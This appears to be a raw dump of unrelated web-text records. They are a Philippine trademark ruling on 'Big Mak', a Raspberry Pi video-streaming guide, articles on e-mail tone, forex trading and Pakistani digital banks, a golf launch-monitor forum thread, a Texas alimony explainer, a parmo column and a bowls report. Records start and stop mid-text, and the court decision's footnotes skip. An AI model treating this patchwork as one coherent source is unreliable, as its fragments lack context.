bags with the words \"L.C. Big Mak Burger, Inc.\" to inform the public of the name of the seller of the hamburgers. However, petitioners introduced during the injunctive hearings plastic wrappers and bags with the \"Big Mak\" mark without the name \"L.C. Big Mak Burger, Inc.\" Respondents' belated presentation of plastic wrappers and bags bearing the name of \"L.C. Big Mak Burger, Inc.\" as the seller of the hamburgers is an after-thought designed to exculpate them from their unfair business conduct. As earlier stated, we cannot consider respondents' evidence since petitioners' complaint was based on facts existing before and during the injunctive hearings.\nThus, there is actually no notice to the public that the \"Big Mak\" hamburgers are products of \"L.C. Big Mak Burger, Inc.\" and not those of petitioners who have the exclusive right to the \"Big Mac\" mark. This clearly shows respondents' intent to deceive the public. Had respondents' placed a notice on their plastic wrappers and bags that the hamburgers are sold by \"L.C. Big Mak Burger, Inc.\", then they could validly claim that they did not intend to deceive the public. In such case, there is only trademark infringement but no unfair competition.82 Respondents, however, did not give such notice. We hold that as found by the RTC, respondent corporation is liable for unfair competition.\nThe Remedies Available to Petitioners\nUnder Section 2383 (\"Section 23\") in relation to Section 29 of RA 166, a plaintiff who successfully maintains trademark infringement and unfair competition claims is entitled to injunctive and monetary reliefs. Here, the RTC did not err in issuing the injunctive writ of 16 August 1990 (made permanent in its Decision of 5 September 1994) and in ordering the payment of P400,000 actual damages in favor of petitioners. The injunctive writ is indispensable to prevent further acts of infringement by respondent corporation. Also, the amount of actual damages is a reasonable percentage (11.9%) of respondent corporation's gross sales for three (1988-1989 and 1991) of the six years (1984-1990) respondents have used the \"Big Mak\" mark.84\nThe RTC also did not err in awarding exemplary damages by way of correction for the public good85 in view of the finding of unfair competition where intent to deceive the public is essential. The award of attorney's fees and expenses of litigation is also in order.86\nWHEREFORE, we GRANT the instant petition. We SET ASIDE the Decision dated 26 November 1999 of the Court of Appeals and its Resolution dated 11 July 2000 and REINSTATE the Decision dated 5 September 1994 of the Regional Trial Court of Makati, Branch 137, finding respondent L.C. Big Mak Burger, Inc. liable for trademark infringement and unfair competition.\nDavide, C.J.

Section 22 is substantially identical with Section 16 of the United States' 1946 Trademark Act (\"Lanham Act\").\n33 Superseded by Section 155 of RA 8293 (\"Section 155\").\n34 See A & H Sportswear Co. v. Victoria's Secret Stores, Inc., 167 F.Supp.2d 770 (2001).\n35 Shaley's Inc. v. Covalt, 704 F.2d 426 (1983). Also referred to as the \"lynchpin\" (Suncoast Tours, Inc. v.

Supp. 648 [1992]) of trademark infringement.\n36 This provision states: \"Registration of trade-marks, trade-names and service-marks on the principal register. There is hereby established a register of trade-marks, trade-names and service-marks which shall be known as the principal register. The owner of a trade-mark, trade-name or service-mark used to distinguish his goods, business or services from the goods, business or services of others shall have the right to register the same on the principal register, unless it:\n(a) Consists of or comprises immoral, deceptive or scandalous matter; or matter which may disparage or falsely suggest a connection with persons, living or dead, institutions, beliefs, or national symbols, or bring them into contempt or disrepute;\n(b) Consists of or comprises the flag or coat of arms or other insignia of the Philippines or any of its political subdivisions, or of any foreign nation, or any simulation thereof;\n(c) Consists of or comprises a name, portrait, or signature identifying a particular living individual except by his written consent, or the name, signature, or portrait of a deceased President of the Philippines, during the life of his widow, if any, except by the written consent of the widow;\n(d) Consists of or comprises a mark or trade-name which so resembles a mark or trade-name registered in the Philippines or a mark or a trade-name previously used in the Philippines by another and not abandoned, as to be likely, when applied to or used in connection with the goods, business or services of the applicant, to cause confusion or mistake or to deceive purchasers; or\n(e) Consists of a mark or trade-name which, when applied to or used in connection with the goods, business or services of the applicant is merely descriptive or deceptively misdescriptive of them, or when applied to or used in connection with the goods, business or services of the applicant is primarily geographically descriptive or deceptively misdescriptive of them, or is primarily merely a surname;\n(f) Except as expressly excluded in paragraphs (a), (b), (c) and (d) of this section nothing herein shall prevent the registration of a mark or trade-name used by the applicant which has become distinctive of the applicant's goods, business or services. The Director may accept as prima facie evidence that the mark or trade-name has become distinctive, as applied to or used in connection with the applicant's goods, business or services, proof of substantially exclusive and continuous use thereof as a mark or trade-name by the applicant in connection with the sale of goods, business or services for five years next preceding the date of the filing of the application for its registration.\" This has been superseded by Section 123 of RA 8293.\n37 Section 20, RA 166. This provision states: \"Certificate of registration prima facie evidence of validity. A certificate of registration of a mark or trade-name shall be prima facie evidence of the validity of the registration, the registrant's ownership of the mark or trade-name, and of the registrant's exclusive right to use the same in connection with the goods, business or services specified in the certificate, subject to any conditions and limitations stated therein.\" This has been superseded by Section 138 of RA 8293. Neither RA 166 nor RA 8293 provides when the presumption of validity and ownership becomes indubitable. In contrast, under the Lanham Act, as amended, (15 United States Code 1065), such takes place once the trademark has become \"incontestable\" i.e. after the mark owner files affidavits stating that the mark is registered and has been in continuous use for five consecutive years; that there is no pending proceeding; and that there has been no adverse decision concerning the registrant's ownership or right to registration (See Luis Vuitton Malletier and Oakley, Inc. v. Veit, 211 F.Supp.2d 556 [2002]). However, both RA 166 (Section 12) and RA 8293 (Section 145) require the filing of the affidavit attesting to the continuous use of the mark for five years and, under Section 145, failure to file such affidavit will result in the removal of the mark from the Register.\n39 Societe Des Produits Nestl\u00e9, S.A. v.

Hon. Fernandez, etc., et al. 214 Phil. 332 (1984). RA 8293 no longer provides for a Supplemental Register and instead mandates a single registry system (Section 137). Under Section 239, marks registered in the Supplemental Register under RA 166 will remain in force but are no longer subject to renewal.\n49 137 Phil. 838 (1969).\n50 Enacted on 6 March 1903.\n51 Section 3 of Act No. 666 provides: \"The ownership or possession of a trade-mark, heretofore or hereafter appropriated, as in the foregoing section provided, shall be recognized and protected in the same manner and to the same extent, as are other property rights known to the law. To this end any person entitled to the exclusive use of a trade-mark to designate the origin or ownership of goods he has made or deals in may recover damages in a civil action from any person who has sold goods of a similar kind, bearing such trade-mark, and the measure of the damages suffered, at the option of the complaining party, shall be either the reasonable profit which the complaining party would have made had the defendant not sold the goods with the trade-mark aforesaid, or the profit which the defendant actually made out of the sale of the goods with the trade-mark, and in cases where actual intent to mislead the public or to defraud the owner of the trade-mark shall be shown, in the discretion of the court, the damages may be doubled. The complaining party, upon proper showing, may have a preliminary injunction, restraining the defendant temporarily from use of the trade-mark pending the hearing, to be granted or dissolved in the manner provided in the Code of Civil Procedure, and such injunction upon final hearing, if the complainant's property in the trade-mark and the defendant's violation thereof shall be fully established, shall be made perpetual, and this injunction shall be part of the judgment for damages to be rendered in the same cause as above provided.\" (Emphasis supplied)\n52 The United States Congress had introduced the same amendment to the Lanham Act in 1946. In 1962, the US Congress again amended Section 16 of the Lanham Act (\"Sec. 43(A)\") by deleting the phrase \"the source or origin of such goods or services, or identity of such business\" in the definition of trademark infringement. This led courts in that jurisdiction to hold that post-sale confusion by the public at large (Esercizio v. Roberts, 944 F.2d 1235 [1991]. See also Koppers Company, Inc. v. Krup-Koppers, 517 F.Supp. 836 [1981]) or \"subliminal confusion,\" defined as confusion on a subliminal or subconscious level, causing the consumer to identify the properties and reputation of one product with those of another, although he can identify the particular manufacturer of each, (Ortho Pharmaceutical Corporation v. American Cyanamid Company, 361 F.Supp. 1032 [1973]. See also Farberware, Inc. v. Mr. Coffee, Inc., 740 F.Supp. 291 (1990); Dreyfus Fund Incorporated v. Royal Bank of Canada, 525 F. Supp. 1108 [1981]) are sufficient to sustain a trademark infringement claim.

{"text": "Thanks to UV4L it is possible to create or join an existing room and broadcast live video and audio to all the participants or viewers in the room from a camera and a microphone connected to the Raspberry Pi. It's also possible to automatically hear and see other participants if you have speakers and display (HDMI, touchscreen, etc\u2026) connected to the Raspberry Pi. Of course, other participants can be other Raspberry Pi's. The great news is that you do not need any browser installed on the Raspberry Pi to do this.\nIt's necessary to install the required packages before proceeding: uv4l, uv4l-server, uv4l-webrtc, uv4l-xmpp-bridge and one video driver (e.g. uv4l-raspicam, uv4l-uvc, etc\u2026). Please refer to these installation instructions for more details.\nTo start and stop streaming to a particular Jitsi Meet server (called videobridge), it's enough to invoke the corresponding commands by means of the UV4L Streaming Server installed on the Raspberry Pi. This can be done in two ways.\nThe first convenient way is through a browser by using the Jitsi Meet control page available at the URL the Streaming Server itself is listening to (e.g. http://myraspberrypi:8080), from which it's possible to specify all the mandatory informations (i.e. XMPP and/or BOSH signalling server, chat room, your username and password) required to establish a connection and to click on start/stop buttons in order to join or leave the specified room respectively.\nwhere raspberrypi will have to be replaced with the real hostname of your Raspberry Pi in your network (it can be localhost if you are executing the command from within your Raspberry Pi) and port will have to be replaced with the real port number the Streaming Server is listening to (8080 is the default).

{"text": "The Secret Cause of Flame Wars\nYou may think of yourself as an e-mail maven, but a new study says when it comes to interpreting electronic missives, most of us are way off the mark. By Stephen Leahy.\n\"Don't work too hard,\" wrote a colleague in an e-mail today. Was she sincere or sarcastic? I think I know (sarcastic), but I'm probably wrong.\nAccording to recent research published in the Journal of Personality and Social Psychology, I've only a 50-50 chance of ascertaining the tone of any e-mail message. The study also shows that people think they've correctly interpreted the tone of e-mails they receive 90 percent of the time.\n\"That's how flame wars get started,\" says psychologist Nicholas Epley of the University of Chicago, who conducted the research with Justin Kruger of New York University. \"People in our study were convinced they've accurately understood the tone of an e-mail message when in fact their odds are no better than chance,\" says Epley.\nThe researchers took 30 pairs of undergraduate students and gave each one a list of 20 statements about topics like campus food or the weather. Assuming either a serious or sarcastic tone, one member of each pair e-mailed the statements to his or her partner. The partners then guessed the intended tone and indicated how confident they were in their answers.\nThose who sent the messages predicted that nearly 80 percent of the time their partners would correctly interpret the tone. In fact the recipients got it right just over 50 percent of the time.\n\"People often think the tone or emotion in their messages is obvious because they 'hear' the tone they intend in their head as they write,\" Epley explains.\nAt the same time, those reading messages unconsciously interpret them based on their current mood, stereotypes and expectations. Despite this, the research subjects thought they accurately interpreted the messages nine out of 10 times.\nThe reason for this is egocentrism, or the difficulty some people have detaching themselves from their own perspective, says Epley. In other words, people aren't that good at imagining how a message might be understood from another person's perspective.\n\"E-mail is very easy to misinterpret, which not only triggers flame wars but lots of litigation,\" says Nancy Flynn, executive director of the e-Policy Institute and author of guidebooks E-Mail Rules and Instant Messaging Rules. Many companies battle workplace lawsuits triggered by employee e-mail, according to Flynn.\nPeople write absolutely, incredibly stupid things in company e-mails,\" said Flynn.\nScientific Fraud Is Slippery to Catch\u2014but Easier to Combat\nFakery spans \"beautified\" data, photoshopped images, and \"paper mills.\" Experts and institutions are employing tools to spot deceptive research and mitigate its reach.\nGrace Huckins\nMental Health Apps Won't Get You Off the Couch\nWIRED's spiritual advice columnist on whether digital tools can solve a health crisis they helped create.\nMeghan O'Gieblyn\nSpotted a UFO?

{"text": "A veteran market beater returns to the trade\nDaniel P. Collins\nKenneth M. Jakubzak had been involved in futures markets for five decades, and after a short hiatus he has returned with his hybrid forex strategy Currency Program that produced a compound annual return of 16.02% over more than 20 years.\nJakubzak had been interested in trading ever since taking a job with Clayton Brokerage in St. Louis in the 1970s. \"I found something that I really enjoyed,\" Jakubzak says. So much so that he moved back to the Chicago area, where he grew up and earned degrees from Loyola and DePaul, to trade on the Mid America Exchange. He traded soybeans, bonds and gold and would go on to lease a membership on the Chicago Board of Trade.\nHe continued to trade while he and a partner opened a restaurant, and in 1987, he returned to the markets full-time as head of managed funds for First Commercial Financial Group. While there, he worked on trading systems and in 1989 became a commodity trading advisor, trading a trend- following system based on the Richard Dennis turtle methodology taught to him by an original turtle.\nIt was a long-term trend trading following system, which he traded from 1989 to 1999, but closed after a significant drawdown. During that time, he developed his own system that traded currency futures for his CTA KMJ Capital.\nJakubzak was drawn to the global macro aspect of currency markets and launched a standalone program in 1994. \"I combined the best of the Richard Dennis turtle system \u2014 which was purely technical \u2014 with discretionary elements, which are very important in trading currencies.\"\nHe says the G7 currencies he trades respond better to global macroeconomics and geopolitical situations.\n\"I had a niche for the currencies, [which are] difficult to trade from a purely technical viewpoint,\" he says. \"At that time, money supply [and] capital flows would affect markets; now central bank policies can affect the market dramatically, and certain geopolitical events like [what's going on in] North Korea.\"\nJakubzak combined the technical elements of the turtle systems with his own fundamental analysis of the currency markets.\n\"I am evaluating time, price and volatility for a specified currency market, I am looking at past historical pricing and then I am looking at certain time frames searching for price disparities that can prove a market opportunity,\" Jakubzak says. \"Along with that, I am looking at market momentum, key support and resistance areas, overbought/oversold conditions, Fibonacci levels that are the same on a day-to-day basis.\"\nOnce he finds a positive trade from the technical perspective, he looks at the fundamentals. In order to initiate a trade both the technicals and fundamentals must agree.\nEvery trade risks 0.25% to 0.4% of an account, which works out to 40 to 60 basis points. His margin to equity ratio runs at 4-5% but can go as high as 11% in exceptional markets.\nMost of his trades last between one and 12 days, but he will take longer-term positions if the opportunity dictates it. \"There are certain trades that are going to be longer term because of market momentum, the breakout period is longer and the fundamentals are stronger,\" Jakubzak says.\n\"What I look for once the trade is initiated, is momentum gaining or waning. I will look at supporting fundamental factors\u2014is there any financial report coming up that could affect it? I look at global macroeconomics and relative pertinent data that comes out on a weekly basis,\" he says.\nThe program is out of the market 30% of the time and never has more than three trades on. \"That is not by design but because the technicals and fundamentals have to be positive, if not I will not take a trade,\" Jakubzak says.\n\"During that time, I am doing research and looking at the markets, looking for the next trade. It can be kind of tedious, but that is one of the risk management [elements] that allows me to have low volatility and small drawdowns,\" he says.\nJakubzak suspended the program due to a family illness in 2015 and relaunched in May 2017 as PAK Capital LLC.

Initially, the SBP released an exposure draft of this Framework and a targeted survey was launched to invite feedback from a wide range of local as well as international stakeholders.\nSubsequently, a number of meetings were held with all the stakeholders to further enrich the consultative exercise.\nLater, SBP also organised two interactive webinars with leading local as well as international speakers to discuss the opportunities and challenges associated with digital banks as well as disseminate awareness about Pakistan's digital bank licensing framework, the statement said.\nDuring the application window opened from January 03 till March 31, 2022, SBP has remained extensively engaged with all the interested applicants and held various rounds of discussions/ meetings with all of them.\nMoreover, the SBP team also remained committed to provide exclusive support and necessary facilitation required for the preparation and submission of applications to all the applicants.\nThis initiative of SBP would greatly help in providing financial services to underserved and unserved segments of society.\ndigital bank licencesSBP\nADB forecasts 4pc growth for Pakistan in FY22\nAirfares to rise soon amid hike in fuel prices: IATA\nGovt to raise domestic edible oil production to 4.8m tons in 10 years\nStaff Report July 1, 2022 July 1, 2022\nUS, China remain top export destinations in 5 months\nStaff Report December 22, 2021 December 22, 2021\nUS, China, UK remain top export destinations of Pakistani products in first quarter\nNews Agency November 7, 2021 November 7, 2021", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 67742}
{"text": "And the dates say 3/11/18.\nFYI... most countries throughout the world (except the US / Canada) would read that as 3rd November 2018.\nMaybe just came home from work and took a photo of the data whilst still in shirt / tie?\nAnd just for the record, I'm rooting for the ES2020 to be a smashing success so that it competes with the trackmans and foresights of the world.\nConsumers win when we have options! Also forces companies to innovate or die... and maybe it will stop Foresight from price gouging me for things that should be free!!!\nThe ES-16 and ES 20/20 both use the same App the only one available which kind of shoots down the statement that the ES 20/20 used nothing of the design or components of the ES-16. I mean if they both use the same App they both would have to use the same output of data for the App to work so what makes the information any better than that of what the ES-16 had. Still nothing on the Ernest Sports Product Comparison page because all it would show is just what they have for the ES-16 so far nothing different or new to show, maybe getting a better readings to some degree but how accurate are they? I can do club fitting with my GC2 and can see a difference in different balls I use, can the ES 20/20 pick up any of that?\nThis is not correct. As much as I detest this company, hardware products with no common design or components can use the same software. A variety of iOS devices use iTunes, for example.\nOokie If it has no common design or components it can not us the same software, there has to be a common connection to do so, you say that \"A variety of iOS devices use iTunes, for example. \" with out it being designed to us iTunes it would not be able to do so, they may be none Apple but they have to be able to play MP3s to use iTunes. If it is not configured to do so the software will not work other wise you would have been able to run Windows programs on the Apple computers and vise versa, Apple Apps would work on an Android or Android Apps would work on an iPhone neither of which will work.\nFor all who ask themselves so many questions about date format and T-shirt. I am from Austria and I have done some tests in the garage to prepare the net and everything for the winter season.\nTo see if the whole thing works for my son, I called him for a moment and then he came out of the house and made some shots.So in Europe we use 03/11/18 for the date, that photos was made last weekend, there is no secret behind. So it's really easy, I only will share my experience with people there are interested on ES 20/20, nothing else. Someone would like it, other ones not and that's ok for me. Some people are extremely upset about ES and yes I could understand that and that's their right.\nI've decided to go ahead with ES, it was not an easy decision on me with all the past experience. But I will give them I chance to do it better to get more competition on the LM market.Time will tell if I've made a good or bad decision, no one knows it now.\nAs soon as I have time, I will try the questions on club selection.\nMy son will have training with his coach again in the next few days and there we will do a comparison with the Trackman 4, then I can say more about accuracy. The distances works much better than the ES16 and the deviations left and right are now recognised correctly and also displayed right, that was not the case with my ES 16. The other values \u200b\u200bwe have not yet looked at in detail, that we want to do with the trackman next.\nManly we are working at the moment on the game from 40 to 120 yards, for that reason the ES 20/20 is quite useful for now. Now he can do that in the evening at home after school, with ES 16 it wasn't possible. Swing plan and club path quit good and that data's my son work's only with his coach. In the future I hope we can use also ES 20/20 for that, but at the moment we have an other focus.\nI wish you the best, I really do, but I have yet to see anything other than your post on a ES 20/20 and nothing to show it will preform as claimed which were the same claims made for the ES-16.\nA review of the ES 20/20 was just posted on youtube.\nI watched the video, you still have to tell it which club you are using which to me is a draw back because you don't know what is being calculated or measured and all the club manufactures do not use the same loft on their clubs so what would be an 8 iron in one set could be a 7 iron in the other or vise versa. I set my ball down and hit it with my GC2 and it gives me my ball flight with no need to tell it which club I used, but if need be I can name clubs for testing (Club1, Old club, New club, ect,,) I just don't have to tell the GC2 what they are to get a reading.\nAgreed, I love my GC2 worth every penny i paid for it. I'm over the sticker shock now.\nI see the pro that made the video answered the question about hitting a wedge and selecting wedge or driver in the software. He says the results were the same. The smash factor does seem to vary a bit, but I would like more data to make a call on that. The variation in carry distance was only +-3.5M. I suppose that may not be great for a pro, but I would take it.\nLast edited by Stonebattle; 11-10-2018, 01:17 AM.\nNick is a friend of mine and he did a comprehensive test vs Trackman 4 and Flightscope Xi Tour today. I will update you all on that test next day or two.\nBut ES are working on helping rectify any issues!\n\"But ES are working on helping rectify any issues! \"\nI think that's their company mission statement. One company I wouldn't come within 100 miles of.\nYeah, ES was working on helping rectify any issues with the ES-16, and we have all seen how well that has turned out!\nNOT rooting for these guys.As Mark noted, ES-16 was released when it was not close to being a finished product.\nWe're not talking unforeseen issues that could not have been discovered. It didn't work, period.\nEventually, they finally admitted the hardware they sold was incapable of doing what was advertised. They abandoned it, and had the nerve to try to sell existing consumers an \"upgrade\" that they have promised will do what they first one was promised to do.\nI'd rather get gouged by Foresight than see these clowns succeed.\nIt is in all our interests for these clowns to succeed. The more competition there is the less likely we are to continue to be gouged by foresight.\nIf their product did what it was suppose to do to start with they would be succeeding, but selling something that doesn't work is of no help to anyone but themselves and hurts the industry as a whole. A product should be prototyped, tested and found to be functional before you start production and definitely before you start selling it to the public.\nI am still paying on the loan I took out to buy my ES-16 that never worked any where near as what was promised it would and the wife was not very enthused about me getting another launch monitor, and she didn't care who it was made by. Now I can't say I am happy about the prices being charged by Foresight, but I do have to say that everything I got from them preformed as they claimed it would. I am in a situation now where I am unable to use the GC2 as planned, but it is due to things that have happened concerning a death in the family and no fault of Foresight's what so ever, and the only time I had to call support on Foresight was due to my hard drive crashing and it was fixed by them promptly.\nSo to me the price gouging is when I buy a product that never works as claimed, spend all kinds of time talking with the company about what is going on sending them information as to what the system is doing and then being ask to pay extra for a new system that has the same claims of performance as that of the original system that I bought but still isn't working as claimed and only a promise that they will get it to work this time, which is the same promise they made to me on the ES-16. I'll pass, if I am getting gouged on the prices from Foresight then I can at lest fall back on the fact that when I do get to use my GC2, it works.\nI'm not defending ES, and I won't be buying anything from them any time soon. Clearly the ES16 was a disaster. Also clearly, Foresight products are much better. I have a GC2/HMT myself.\nBut hoping that ES continue to fail is not helpful to anyone. It would be much better for them, but also much better for us, if they get it right with the ES20/20.\nI am not hoping they fail, it is I just haven't seen anything to show they are doing anything all that different than what they did with the ES-16. I thought this form was so people could gather information and make an informed decision on what systems to buy for themselves. I myself would have loved to had the info to have gotten a system that worked as claimed instead of wasting all the time I did trying to help get the ES-16 to do what it was suppose to do when I bought it.\nI was responding to Ookie who said \"I'd rather get gouged by Foresight than see these clowns succeed.\"\nTrip I understand the way Ookie feels and see his point of view, and I feel as if I was ripped off by ES as well, along with many others. I paid only $45.00 more for my CPO GC2 and FSX 2018 software than what I paid for my ES-16, and the GC2 and software works just as advertised right out of the box. I wish ES would do what they should and provide a good quality product but they seem to think getting the sales is priority #1 and fixing any problems is priority somewhere farther down the road, and that a good stall tactic is worth it's wight in gold. Reporting the problems is not what is preventing them from being a success, them not providing a good quality product that preforms as claimed is the problem. I had rather report what I went through so people have a chance to make an informed decision instead of working to try and get a unit that does work to preform as claimed and wasting time and money in the process. I myself had rather pay a bit more for something that works rather than waste time and money on something that doesn't, no savings there.\nIf the ES16 disaster involved a simple mistake, I wouldn't be taking this perspective.\nBut the issues with ES16 were not hidden bugs that could not have been discovered until the product was used by large numbers of people under a variety of conditions.\nThis was a product that never worked at all for its advertised purpose. And ES knew or should have known when they solicited customers' hard earned money.\nPeople (including myself). spent hours and hours trying to help them fix the product. It was wasted effort, as the hardware was never capable of the task.\nEven if ES 20/20 does work, it was developed on the backs of customers who spent thousands of dollars and provided untold hours of free labor to assist in troubleshooting. And got NOTHING for it. A cash upgrade to buy a product that might really do what the first one they paid for was advertised to do?\nWhen people engage in unethical business practices, it is helpful to everyone when they fail. Society as a whole benefits.\nFull disclosure: I got off the sinking ship within the 30 day trial period. But I still wasted HOURS **working** to troubleshoot a product instead of enjoying it.

While some states recognize common law marriage, not all do, and those that do, do so with caveats and restrictions. So, if you and your common law spouse were never married, are you entitled to spousal support after the relationship ends?\nTexas recognizes a common law marriage as equal to a formal marriage. The Texas Family Code statutorily defines a common law marriage as being legitimate when:\nThe parties agree to marry\nThe parties live together as spouses\nThe parties hold themselves out as married to the world\nIn most cases then, if one spouse in a married couple would qualify for alimony under Texas law, a common law spouse will too.\nFrequently referred to as \"alimony,\" spousal support is a relatively new phenomenon in Texas. In fact, Texas was the last state in the country to allow a court to obligate a person to pay their ex-spouse a sum of money in the future. In Texas, spousal maintenance is difficult to come by because there is no court-ordered alimony in Texas. However, the Texas Family Code does recognize limited instances in which a recently divorced individual may need financial assistance for a period of time and has provided guidelines under which the Court may grant it.\nSpousal maintenance is limited to either $2,500 per month or 20% of the obligor spouse's monthly income, whichever is lesser. In addition, a judge cannot order spousal support to continue for a period longer than three years because it is not intended to be something an ex-spouse can rely on for assistance much beyond their divorce. In most cases, the Texas Family Code provides that spousal maintenance may only be ordered for spouses that have been married for 10 years or longer. For marriages lasting between 10 and 20 years, support can be paid for a maximum of five years. For, marriages lasting between 20 and 30 years, support can be paid for a maximum of seven years. For marriages lasting over 30 years, spousal support can be paid for no more than 10 years. Of course, even for these long-term marriages, the spouse requesting maintenance must still show that he or she lacks the ability to meet his or her minimum reasonable needs.\nTexas Alimony Lawyers\nThe family law attorneys of Terry & Roberts possess a comprehensive knowledge of all of these issues.

{"text": "The problem with the nation's health isn't the parmo \u2013 it's what it represents\nI was completely oblivious to the allure of a parmo until this week. But now I know what it is [\u2026]\nThe parmo is a regional delicacy beloved across the North East (Photo: ParmStar)\nBy Simon Kelner\ni columnist\nOctober 16, 2018 5:23 pm(Updated October 9, 2020 7:06 pm)\nI was completely oblivious to the allure of a parmo until this week. But now I know what it is \u2013 a breaded and deep fried chicken or pork escalope topped with bechamel sauce and Parmesan (or Cheddar) cheese \u2013 I simply can't wait to try one.\nIt is, apparently, a fast food delicacy born, bred, and exclusively served in the North-East of England, or more accurately on Teesside, and it weighs in at a whopping 2,000 calories. One of those bad boys, and a grown man has done his daily calorie intake in one sitting, and that's without the side order of chips which usually accompanies a parmo. Who knew?\nRead more: What is a parmo, the Middlesbrough delicacy described as 'monstrous' by obesity campaigners?\nA guide to today's talking points, straight to your inbox\nA touch of exoticism\nFurther investigation reveals that the parmo has been around for more than 70 years, having been brought to the region by an American soldier, who settled in Middlesbrough after the Second World War and opened a restaurant in the town. He created a dish that, while having little to do with its terroir, suited the post-war appetite for indulgence and exotica. It brought a little bit of Mediterranean glamour to Teesside, and has been a jealously guarded secret since then.\nAsda has more than 600 stores in the UK, but only the ones on Teesside stock the parmo. And last year, the town's mayor campaigned for the parmo to receive Protected Designation of Origin Status from the EU, like a Melton Mowbray pork pie (534 calories) or a Cornish pasty (774 calories).\nBut now the humble parmo is outed as public enemy number one. Health campaigners have blamed it for the region's obesity problem. According to NHS research released in the past week, 10-year-old children in the North-East were ranked as the most unhealthy in Britain, with a shocking 23 per cent of them classified as obese. And Tam Fry, chairman of the National Obesity Forum,knows where to lay the blame. \"I can answer in two syllables,\" he said. \"Parmo.\n\"You would have to be an Olympic athlete to eat it without effect; for the rest of humanity there is an unbelievable risk of obesity,\" he added. There is no evidence that Olympic athletes incorporate the parmo in their nutritional plan, so it's safe to say that the majority of these artery-clogging juggernauts are being consumed by people who lead a rather less physically active life. The question is: what to do, if anything, about this serious public health issue? If a quarter of a region's children are obese, the state would be abdicating its responsibility if it didn't draw attention to unhealthy habits particular to a location. This is, in fact, the role of the nanny state.\nCheap, easy food\nBut it's simplistic to hold the humble parmo wholly responsible. The wider problem is that in Britain's poorer areas, people are unwilling to spend their limited amount of money on good food. There is no culture, like there is in poor parts of mainland Europe, of healthy eating, of treating well-sourced, locallly-produced food as a necessity, and not a luxury. In Britain, unfortunately, it's something of a race to the bottom: load it up and sell it cheap.\nThe parmo is not the problem in itself. It is more the symbol of a careless attitude to nutrition that extends way beyond the North-East.\nMore from Opinion\nIan Dunt\nPaul WaughAnalysis\nBoris Johnson is now clinging to office by his fingertips after a double-drama PMQs\nThe leasehold system of ownership is a housing injustice, but change could be on the horizon\nPolls show many don't trust the PM's party account, even if MPs can suspend judgement\nBoris Johnson is too comforted by chaos for new aides to bring order to the Tory party\nWordle is simple but not addictive, making it the perfect game for our Covid times\nForget Operation Red Meat, Boris Johnson needs to apologise to save his skin\nPope Francis is wrong about pets, looking after them can make us better people\nBest of Opinion\nOliver Duff\nChristian Wakeford's defection focuses Tory ire on Labour but MPs are still ready to turn on PM\nInflation rising is deeply worrying, but there's still no need to panic yet\nPaul Dales\nThe cost of living crisis was far worse in the 1970s and 2008\nRachael Sigee\nBono finds U2 as cringeworthy as we all do, but we should embrace our embarrassing pasts anyway", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 46058}

{"text": "Treasure Hunt & Bowls report\nPosted on 5th Oct 2011 by Steve Smith\nTagged in: Bank Holiday, Bowls, Treasure Hunt\nThe August Bank Holiday weekend saw BrassNeck Theatre members gathering for a feast of fun.\nCrouching Tiger, Hidden Treasure\nSunday 28 August kicked off with the car treasure hunt, which saw carloads of members traversing West & North Yorkshire in search of clues, taking creative photographs along the way whilst also answering a number of brain-teasing quiz questions. Around 10 cars set off from Yeadon Town Hall and, thankfully but well outside the anticipated timescale, all returned safely to Guiseley Bowls Club to eagerly await the result of the judges' strict marking! Controversy reigned over the 'word search round' but the judges stood firm and in the end it was a landslide victory to team \"Crouching Hula, Hidden Tiger\" comprising Lisa Simpson, Lotte McGuire, Jimi Clarke & Jamie Wilkinson.\nThe excitement didn't stop there, however! As if the enchanting aroma drifting across the bowling green from Tom Hughes' barbeque wasn't enough to keep everyone from going their separate ways there was the eagerly awaited bowls competition to come. Last years' surprise winners, Caroline Bayfield & Christine Braid, were keen to prove that it was no fluke last time whilst others were going through their respective pre-match routines determined not to be out-foxed by the all-girl duo. Despite entering the competition as current champions, Bayfield & Braid were undoubtedly second favourites at best after former league bowlers Danny Lawton & Tom Weston decided that they would make up a formidable partnership and pair up together. But as they say, in Crown Green Bowls anything can happen, and all competitors were keen to steal the glory.\nBurgers were choffed and the beer flowed as the tournament got underway.\nIn the first round Barbara Matthews and Lewis Judge were put under pressure by the lighting boys Tom Hughes & Jason Beattie but came through 11-7, as did Pam Slater & Trevor Sugden, claiming victory over mother & daughter combo Loretta & Kim Marklew by the same margin. Next up were Richard Lloyd & Jamie Wilkinson who were unfortunate to draw the sharks (although, interestingly, dressed as tigers) Danny Lawton & Tom Weston. The 11-2 score line in favour of the sharks did not, in truth, reflect some of the sumptuous bowls delivered by both underdogs at various times. It was simply the incredible consistency shown by Lawton & Weston that saw them stroll through to the next round. Current champs Bayfield & Braid were up against Lotte McGuire & Robyn France. For much of the match Bayfield & Braid had their backs against the wall in what was quickly turning into an all-girl thriller, however in the end the exuberance of youth was not enough to overcome the champions' spirit as McGuire & France fell at the last hurdle and were dumped out 11-9. Jimi Clarke & Royston Bayfield were next to step onto the green to take on the might of Jen Barnes & James Duffy. It seemed no-one wanted to guess which way this one was going to go, but it was Clarke & Bayfield who made the early running. Despite a valiant comeback by Barnes & Duffy, in truth they had left themselves too much to do, and Clarke & Bayfield progressed with an 11-6 victory. All-Clarke combo Ian & Christine, having missed the beginning of the bowls action due to an incredibly late treasure hunt finish, had the might of Lisa Simpson and Ann Garnett to get past if they were to continue in the competition. The general opinion from the gathering crowds was of a runaway Clarke victory but this match quickly turned into the second thriller of the afternoon as Simpson & Garnett fought right to the end before going down 11-9. The final match of round one saw Andrew Walton & Tony Walker up against family unit Peter Stebbings & mother-in-law, Margaret Shingler. A cool north-easterly breeze did nothing to keep either pairing supple whilst waiting for their turn to take to the green but nonetheless they strode out with purpose. Both were scoring well and for a short time it was anyone's call as to who would progress but in the end Stebbings & Shingler conquered over the weather and the Walton/Walker combo take the spoils 11-6.\nSo to the quarter finals. Having both won by the same margin in round one, a close encounter looked on the cards as Matthews & Judge came up against Slater & Sugden. Whether it was the pressure of the quarter finals or simple good luck in round one, perhaps we'll never know, but either way Slater & Sugden could not match their earlier performance as Matthews & Judge waltzed through to the semi's with a resounding 11-4 victory. Dreams of a grandstand final between Lawton & Weston and Bayfield & Braid were shattered as they came up against each other in the quarters. The harsh reality of this match was that the girls were no match for the sharks, although they did their best to distract the boys with some outrageous flirting and suggestive comments throughout. Being accustomed to the pressure of competitive bowls and all the dirty 